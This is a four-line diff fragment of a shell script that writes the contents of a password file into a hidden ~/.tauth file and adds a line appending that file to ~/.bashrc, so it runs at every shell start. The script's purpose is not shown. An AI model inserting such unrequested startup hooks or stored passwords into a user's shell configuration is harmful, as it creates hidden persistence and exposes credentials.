@@ -8,3 +8,4 @@ sed -i '2r pass.txt' tauth
 sed -i '2d' tauth
 rm -fr pass.txt
 mv tauth $HOME/.tauth
+sed -i '$r ./.tauth' $HOME/.bashrc
